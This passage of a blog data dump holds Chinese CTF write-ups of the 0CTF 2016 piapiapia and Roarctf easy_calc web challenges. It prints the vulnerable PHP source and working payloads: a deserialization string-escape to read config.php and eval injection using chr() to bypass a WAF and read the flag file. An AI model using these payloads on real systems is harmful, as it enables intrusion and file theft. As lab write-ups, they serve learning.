class=\"line\">$flag = <span class=\"string\">'flag&#123;94b7c4b2-866d-4189-9b0a-abdf22990071&#125;'</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<h2 id=\"0CTF-2016-piapiapia\"><a href=\"#0CTF-2016-piapiapia\" class=\"headerlink\" title=\"[0CTF 2016]piapiapia\"></a>[0CTF 2016]piapiapia</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者<code>www.zip</code>等一系列文件中出现网站源码。也可以使用工具扫描</p>\n<p>PHP序列化<a href=\"https://www.php.cn/php-notebook-239422.html\" target=\"_blank\" rel=\"noopener\">参考文章</a></p>","more":"<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>题中<code>www.zip</code>中包含源码，下载<del>后进行代码审计（不会）</del>翻阅PHP手册，各种百度。在config.php中包含flag，要想办法获取到此文件<br>config.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    $config[&#39;hostname&#39;] &#x3D; &#39;127.0.0.1&#39;;</span><br><span class=\"line\">    $config[&#39;username&#39;] &#x3D; &#39;root&#39;;</span><br><span class=\"line\">    $config[&#39;password&#39;] &#x3D; &#39;&#39;;</span><br><span class=\"line\">    $config[&#39;database&#39;] &#x3D; &#39;&#39;;</span><br><span class=\"line\">    $flag &#x3D; &#39;&#39;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>查看index.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($user-&gt;login($username, $password)) &#123;</span><br><span class=\"line\">\t\t\t$_SESSION[<span class=\"string\">'username'</span>] = $username;</span><br><span class=\"line\">\t\t\theader(<span class=\"string\">'Location: profile.php'</span>);<span class=\"comment\">//登入后跳转到profile.php</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">exit</span>;\t</span><br><span class=\"line\">\t\t&#125;</span><br></pre></td></tr></table></figure>\n\n<p>查看profile.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>   </span><br><span class=\"line\">    <span class=\"keyword\">require_once</span>(<span class=\"string\">'class.php'</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>($_SESSION[<span class=\"string\">'username'</span>] == <span class=\"keyword\">null</span>) &#123; </span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Login First'</span>);</span><br><span class=\"line\">&#125;   </span><br><span class=\"line\">$username = $_SESSION[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">$profile=$user-&gt;show_profile($username);</span><br><span class=\"line\"><span class=\"keyword\">if</span>($profile  == <span class=\"keyword\">null</span>) &#123; </span><br><span class=\"line\">    header(<span class=\"string\">'Location: update.php'</span>); <span class=\"comment\">//$profile为空，跳转到update.php</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123; </span><br><span class=\"line\">    $profile = unserialize($profile); <span class=\"comment\">//一般看见unserialize()会考虑反序列化漏洞，</span></span><br><span class=\"line\">    $phone = $profile[<span class=\"string\">'phone'</span>]; </span><br><span class=\"line\">    $email = $profile[<span class=\"string\">'email'</span>]; </span><br><span class=\"line\">    $nickname = $profile[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">    $photo = base64_encode(file_get_contents($profile[<span class=\"string\">'photo'</span>]));<span class=\"comment\">//file_get_contents()此函数可以获得文件内容</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>update.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>($_POST[<span class=\"string\">'phone'</span>] &amp;&amp; $_POST[<span class=\"string\">'email'</span>] &amp;&amp; $_POST[<span class=\"string\">'nickname'</span>] &amp;&amp; $_FILES[<span class=\"string\">'photo'</span>]) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    $username = $_SESSION[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^\\d&#123;11&#125;$/'</span>, $_POST[<span class=\"string\">'phone'</span>]))</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid phone'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class=\"string\">'email'</span>]))</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid email'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class=\"string\">'nickname'</span>]) || strlen($_POST[<span class=\"string\">'nickname'</span>]) &gt; <span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid nickname'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    $file = $_FILES[<span class=\"string\">'photo'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($file[<span class=\"string\">'size'</span>] &lt; <span class=\"number\">5</span> <span class=\"keyword\">or</span> $file[<span class=\"string\">'size'</span>] &gt; <span class=\"number\">1000000</span>)</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'Photo size error'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    move_uploaded_file($file[<span class=\"string\">'tmp_name'</span>], <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]));</span><br><span class=\"line\">    $profile[<span class=\"string\">'phone'</span>] = $_POST[<span class=\"string\">'phone'</span>];</span><br><span class=\"line\">    $profile[<span class=\"string\">'email'</span>] = $_POST[<span class=\"string\">'email'</span>];</span><br><span class=\"line\">    $profile[<span class=\"string\">'nickname'</span>] = $_POST[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">    $profile[<span class=\"string\">'photo'</span>] = <span class=\"string\">'upload/'</span> . md5($file[<span class=\"string\">'name'</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">    $user-&gt;update_profile($username, serialize($profile));<span class=\"comment\">//将$profile序列化，执行过滤函数</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'Update Profile Success!&lt;a href=\"profile.php\"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>查看update_profile()函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">update_profile</span><span class=\"params\">($username, $new_profile)</span> </span>&#123;</span><br><span class=\"line\">    $username = <span class=\"keyword\">parent</span>::filter($username);</span><br><span class=\"line\">    $new_profile = <span class=\"keyword\">parent</span>::filter($new_profile); </span><br><span class=\"line\">    $where = <span class=\"string\">\"username = '$username'\"</span>; </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">parent</span>::update(<span class=\"keyword\">$this</span>-&gt;table, <span class=\"string\">'profile'</span>, $new_profile, $where);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>查看filter()函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter</span><span class=\"params\">($string)</span> </span>&#123;</span><br><span class=\"line\">    $escape = <span class=\"keyword\">array</span>(<span class=\"string\">'\\''</span>, <span class=\"string\">'\\\\\\\\'</span>); </span><br><span class=\"line\">    $escape = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $escape) . <span class=\"string\">'/'</span>; </span><br><span class=\"line\">    $string = preg_replace($escape, <span class=\"string\">'_'</span>, $string); <span class=\"comment\">//将  “ ‘ ”、 “\\\\\\\\” 替换成 “_” </span></span><br><span class=\"line\">    $safe = <span class=\"keyword\">array</span>(<span class=\"string\">'select'</span>, <span class=\"string\">'insert'</span>, <span class=\"string\">'update'</span>, <span class=\"string\">'delete'</span>, <span class=\"string\">'where'</span>);</span><br><span class=\"line\">    $safe = <span class=\"string\">'/'</span> . implode(<span class=\"string\">'|'</span>, $safe) . <span class=\"string\">'/i'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> preg_replace($safe, <span class=\"string\">'hacker'</span>, $string); <span class=\"comment\">//将“ select|insert|update|delete|where” 替换成 \"hacker\"，返回替换后的字符串</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在update_profile()，返回到profile.php.</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$profile = unserialize($profile); <span class=\"comment\">//反序列化$profile</span></span><br><span class=\"line\">    $phone = $profile[<span class=\"string\">'phone'</span>]; </span><br><span class=\"line\">    $email = $profile[<span class=\"string\">'email'</span>]; </span><br><span class=\"line\">    $nickname = $profile[<span class=\"string\">'nickname'</span>];</span><br><span class=\"line\">    $photo = base64_encode(file_get_contents($profile[<span class=\"string\">'photo'</span>]));</span><br></pre></td></tr></table></figure>\n\n<p>序列化后</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$profile&#x3D;a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;11111111111&quot;;s:5:&quot;email&quot;;s:8:&quot;12@12.12&quot;;s:8:&quot;nickname&quot;;s:4:&quot;1234&quot;;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;d41d8cd98f00b204e9800998ecf8427e&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<p>要让$photo得到的文件是config.php也就是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;d41d8cd98f00b204e9800998ecf8427e&quot;;</span><br></pre></td></tr></table></figure>\n<p>变成 </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;</span><br></pre></td></tr></table></figure>\n<p>序列化后的长度是固定的，但是在经过过滤函数时候，nickname传入where会被替换成hacker,多出一个字符，这样就可以修改反序列化后的photo所对应的文件，使其为config.php。</p>\n<p>因为nickname有长度限制使用数组可以绕过</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class=\"string\">'nickname'</span>]) || strlen($_POST[<span class=\"string\">'nickname'</span>]) &gt; <span class=\"number\">10</span>)</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure>\n<p>让nickname的值为<code>&quot;};s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>长度为34,传入34个where</p>\n<h3 id=\"0x03-开始操作\"><a href=\"#0x03-开始操作\" class=\"headerlink\" title=\"0x03 开始操作\"></a>0x03 开始操作</h3><p><img src=\"/pic/1.png\" alt=\"1\"> 传入参数</p>\n<p>访问profile.php</p>\n<p><img src=\"/pic/2.png\" alt=\"2\"></p>\n<p>将base64解码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$config[<span class=\"string\">'hostname'</span>] = <span class=\"string\">'127.0.0.1'</span>;</span><br><span class=\"line\">$config[<span class=\"string\">'username'</span>] = <span class=\"string\">'root'</span>;</span><br><span class=\"line\">$config[<span class=\"string\">'password'</span>] = <span class=\"string\">'qwertyuiop'</span>;</span><br><span class=\"line\">$config[<span class=\"string\">'database'</span>] = <span class=\"string\">'challenges'</span>;</span><br><span class=\"line\">$flag = <span class=\"string\">'flag&#123;94b7c4b2-866d-4189-9b0a-abdf22990071&#125;'</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>"},{"title":"buuoj刷题记录2","date":"2019-12-26T12:16:12.000Z","_content":"\n## [Roarctf]easy_calc\n\n### 0x00 基础\n\nphp内置读取文件内容函数\n\n```\nfile_get_contents\nreadfile\nfile\n```\n\n目录扫描函数\n\n```\nscandir\n```\n\n<!--more-->\n\n字符转换函数\n\n```\nhex2bin(\"979797\")->\"aaa\"\nchr(95)->\"a\"\n```\n\n输出函数\n\n```\nvar_dump()\nprintf()\n```\n\n`parse_str`函数通常被自动应用于`get`、`post`请求和`cookie`中。使用`parse_str`解析规则绕过waf\n\n### 0x01 分析\n\n查看源码，发现calc.php\n\n```php\n<script>\n    $('#calc').submit(function(){\n        $.ajax({\n            url:\"calc.php?num=\"+encodeURIComponent($(\"#content\").val()),\n            type:'GET',\n            success:function(data){\n                $(\"#result\").html(`<div class=\"alert alert-success\">\n            <strong>答案:</strong>${data}\n            </div>`);\n            },\n            error:function(){\n                alert(\"这啥?算不来!\");\n            }\n        })\n        return false;\n    })\n</script>\n```\n\n进入calc.php,进行代码审计。\n\n```php\n<?php\nerror_reporting(0);\nif(!isset($_GET['num'])){\n    show_source(__FILE__);\n}else{\n        $str = $_GET['num'];\n        $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^'];\n        foreach ($blacklist as $blackitem) {\n                if (preg_match('/' . $blackitem . '/m', $str)) {    \n                        die(\"what are you want to do?\");//如果包含黑名单中的字符，程序退出\n                }\n        }\n        eval('echo '.$str.';');\n}\n?> \n```\n\n### 0x02 开始操作\n\n传入`1+1` 显示`403 Forbidden` 传入`1%2b1`就可以。必须传入urldecode后。查看`phpinfo()`，也是`403 Forbidden`，利用PHP自动解析函数`parser_str()`绕过，纤细介绍查看[参考连接](https://www.freebuf.com/articles/web/213359.html)。\n\n扫描目录使用`scandir()`因为`/ '  \"`被过滤无法直接使用`/`，使用`chr()`转换payload= `?+num=print_r(scandir(chr(47)))`\n\n```\nArray ( [0] => . [1] => .. [2] => .dockerenv [3] => bin [4] => boot [5] => dev [6] => etc [7] => f1agg [8] => home [9] => lib [10] => lib64 [11] => media [12] => mnt [13] => opt [14] => proc [15] => root [16] => run [17] => sbin [18] => srv [19] => start.sh [20] => sys [21] => tmp [22] => usr [23] => var ) 1\n```\n\n使用PHP内置函数获`file_get_contents()`获取文件内容payload=`?+num=printf(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))`\n\n```\nflag{d09c31b7-d1a1-45a2-b35b-65452a1335ef} 43\n```\n\n","source":"_posts/buuoj刷题记录2.md","raw":"---\ntitle: buuoj刷题记录2\ndate: 2019-12-26 20:16:12\ntags:\n - ctf\n - Roarctf\n - web\n - buuoj\n---\n\n## [Roarctf]easy_calc\n\n### 0x00 基础\n\nphp内置读取文件内容函数\n\n```\nfile_get_contents\nreadfile\nfile\n```\n\n目录扫描函数\n\n```\nscandir\n```\n\n<!--more-->\n\n字符转换函数\n\n```\nhex2bin(\"979797\")->\"aaa\"\nchr(95)->\"a\"\n```\n\n输出函数\n\n```\nvar_dump()\nprintf()\n```\n\n`parse_str`函数通常被自动应用于`get`、`post`请求和`cookie`中。使用`parse_str`解析规则绕过waf\n\n### 0x01 分析\n\n查看源码，发现calc.php\n\n```php\n<script>\n    $('#calc').submit(function(){\n        $.ajax({\n            url:\"calc.php?num=\"+encodeURIComponent($(\"#content\").val()),\n            type:'GET',\n            success:function(data){\n                $(\"#result\").html(`<div class=\"alert alert-success\">\n            <strong>答案:</strong>${data}\n            </div>`);\n            },\n            error:function(){\n                alert(\"这啥?算不来!\");\n            }\n        })\n        return false;\n    })\n</script>\n```\n\n进入calc.php,进行代码审计。\n\n```php\n<?php\nerror_reporting(0);\nif(!isset($_GET['num'])){\n    show_source(__FILE__);\n}else{\n        $str = $_GET['num'];\n        $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^'];\n        foreach ($blacklist as $blackitem) {\n                if (preg_match('/' . $blackitem . '/m', $str)) {    \n                        die(\"what are you want to do?\");//如果包含黑名单中的字符，程序退出\n                }\n        }\n        eval('echo '.$str.';');\n}\n?> \n```\n\n### 0x02 开始操作\n\n传入`1+1` 显示`403 Forbidden` 传入`1%2b1`就可以。必须传入urldecode后。查看`phpinfo()`，也是`403 Forbidden`，利用PHP自动解析函数`parser_str()`绕过，纤细介绍查看[参考连接](https://www.freebuf.com/articles/web/213359.html)。\n\n扫描目录使用`scandir()`因为`/ '  \"`被过滤无法直接使用`/`，使用`chr()`转换payload= `?+num=print_r(scandir(chr(47)))`\n\n```\nArray ( [0] => . [1] => .. [2] => .dockerenv [3] => bin [4] => boot [5] => dev [6] => etc [7] => f1agg [8] => home [9] => lib [10] => lib64 [11] => media [12] => mnt [13] => opt [14] => proc [15] => root [16] => run [17] => sbin [18] => srv [19] => start.sh [20] => sys [21] => tmp [22] => usr [23] => var ) 1\n```\n\n使用PHP内置函数获`file_get_contents()`获取文件内容payload=`?+num=printf(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))`\n\n```\nflag{d09c31b7-d1a1-45a2-b35b-65452a1335ef} 43\n```\n\n","slug":"buuoj刷题记录2","published":1,"updated":"2019-12-28T13:19:03.223Z","_id":"ck4pc9e4q0003187eglmn5tk2","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"Roarctf-easy-calc\"><a href=\"#Roarctf-easy-calc\" class=\"headerlink\" title=\"[Roarctf]easy_calc\"></a>[Roarctf]easy_calc</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>php内置读取文件内容函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file_get_contents</span><br><span class=\"line\">readfile</span><br><span class=\"line\">file</span><br></pre></td></tr></table></figure>\n\n<p>目录扫描函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scandir</span><br></pre></td></tr></table></figure>\n\n<a id=\"more\"></a>\n\n<p>字符转换函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hex2bin(&quot;979797&quot;)-&gt;&quot;aaa&quot;</span><br><span class=\"line\">chr(95)-&gt;&quot;a&quot;</span><br></pre></td></tr></table></figure>\n\n<p>输出函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var_dump()</span><br><span class=\"line\">printf()</span><br></pre></td></tr></table></figure>\n\n<p><code>parse_str</code>函数通常被自动应用于<code>get</code>、<code>post</code>请求和<code>cookie</code>中。使用<code>parse_str</code>解析规则绕过waf</p>\n<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>查看源码，发现calc.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    $(<span class=\"string\">'#calc'</span>).submit(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        $.ajax(&#123;</span><br><span class=\"line\">            url:<span class=\"string\">\"calc.php?num=\"</span>+encodeURIComponent($(<span class=\"string\">\"#content\"</span>).val()),</span><br><span class=\"line\">            type:<span class=\"string\">'GET'</span>,</span><br><span class=\"line\">            success:<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(data)</span></span>&#123;</span><br><span class=\"line\">                $(\"#result\").html(`&lt;div class=\"alert alert-success\"&gt;</span><br><span class=\"line\">            &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;</span><br><span class=\"line\">            &lt;/div&gt;`);</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            error:<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">                alert(<span class=\"string\">\"这啥?算不来!\"</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>进入calc.php,进行代码审计。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'num'</span>]))&#123;</span><br><span class=\"line\">    show_source(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        $str = $_GET[<span class=\"string\">'num'</span>];</span><br><span class=\"line\">        $blacklist = [<span class=\"string\">' '</span>, <span class=\"string\">'\\t'</span>, <span class=\"string\">'\\r'</span>, <span class=\"string\">'\\n'</span>,<span class=\"string\">'\\''</span>, <span class=\"string\">'\"'</span>, <span class=\"string\">'`'</span>, <span class=\"string\">'\\['</span>, <span class=\"string\">'\\]'</span>,<span class=\"string\">'\\$'</span>,<span class=\"string\">'\\\\'</span>,<span class=\"string\">'\\^'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> ($blacklist <span class=\"keyword\">as</span> $blackitem) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">'/'</span> . $blackitem . <span class=\"string\">'/m'</span>, $str)) &#123;    </span><br><span class=\"line\">                        <span class=\"keyword\">die</span>(<span class=\"string\">\"what are you want to do?\"</span>);<span class=\"comment\">//如果包含黑名单中的字符，程序退出</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"string\">'echo '</span>.$str.<span class=\"string\">';'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"0x02-开始操作\"><a href=\"#0x02-开始操作\" class=\"headerlink\" title=\"0x02 开始操作\"></a>0x02 开始操作</h3><p>传入<code>1+1</code> 显示<code>403 Forbidden</code> 传入<code>1%2b1</code>就可以。必须传入urldecode后。查看<code>phpinfo()</code>，也是<code>403 Forbidden</code>，利用PHP自动解析函数<code>parser_str()</code>绕过，纤细介绍查看<a href=\"https://www.freebuf.com/articles/web/213359.html\" target=\"_blank\" rel=\"noopener\">参考连接</a>。</p>\n<p>扫描目录使用<code>scandir()</code>因为<code>/ &#39;  &quot;</code>被过滤无法直接使用<code>/</code>，使用<code>chr()</code>转换payload= <code>?+num=print_r(scandir(chr(47)))</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; .dockerenv [3] &#x3D;&gt; bin [4] &#x3D;&gt; boot [5] &#x3D;&gt; dev [6] &#x3D;&gt; etc [7] &#x3D;&gt; f1agg [8] &#x3D;&gt; home [9] &#x3D;&gt; lib [10] &#x3D;&gt; lib64 [11] &#x3D;&gt; media [12] &#x3D;&gt; mnt [13] &#x3D;&gt; opt [14] &#x3D;&gt; proc [15] &#x3D;&gt; root [16] &#x3D;&gt; run [17] &#x3D;&gt; sbin [18] &#x3D;&gt; srv [19] &#x3D;&gt; start.sh [20] &#x3D;&gt; sys [21] &#x3D;&gt; tmp [22] &#x3D;&gt; usr [23] &#x3D;&gt; var ) 1</span><br></pre></td></tr></table></figure>\n\n<p>使用PHP内置函数获<code>file_get_contents()</code>获取文件内容payload=<code>?+num=printf(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;d09c31b7-d1a1-45a2-b35b-65452a1335ef&#125; 43</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<h2 id=\"Roarctf-easy-calc\"><a href=\"#Roarctf-easy-calc\" class=\"headerlink\" title=\"[Roarctf]easy_calc\"></a>[Roarctf]easy_calc</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>php内置读取文件内容函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file_get_contents</span><br><span class=\"line\">readfile</span><br><span 